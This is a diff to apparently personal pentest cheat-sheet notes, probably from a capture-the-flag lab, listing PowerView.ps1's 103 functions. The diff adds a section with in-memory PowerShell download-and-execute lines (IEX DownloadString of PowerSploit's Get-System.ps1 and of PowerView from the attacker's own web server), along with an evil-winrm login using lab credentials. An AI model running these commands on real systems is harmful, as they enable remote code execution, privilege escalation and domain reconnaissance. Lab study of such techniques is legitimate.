@@ -2,7 +2,7 @@
 
 ### TL;DR
 ```
-
+cat PowerView.ps1 | grep ^funct |nl
 ```
 
 ### 
@@ -51,9 +51,9 @@ At C:\PowerView.ps1:5253 char:20
 
 ```
 
-### 
+### 103 functions in PowerView.ps1
 ```
-$ cat PowerView.ps1 | g ^funct |nl
+$ cat PowerView.ps1 | grep ^funct |nl
      1  function New-InMemoryModule {
      2  function func {
      3  function Add-Win32Type
@@ -157,4 +157,24 @@ $ cat PowerView.ps1 | g ^funct |nl
    101  function Get-DomainForeignGroupMember {
    102  function Get-DomainTrustMapping {
    103  function Get-GPODelegation {
+```
+
+### Some more in-memory PS injections
+https://gist.github.com/bad-bit/b7157c624a820f3d982e38a8b628f590
+```
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1');
+```
+
+# local
+```
+cd ~/tools
+python -m http.server 80
+```
+
+# remote
+```
+evil-winrm -i $ip -u svc-alfresco -p s3rvice
+menu
+IEX (New-Object Net.WebClient).DownloadString('http://$myip/PowerView.ps1');
+menu
 ```
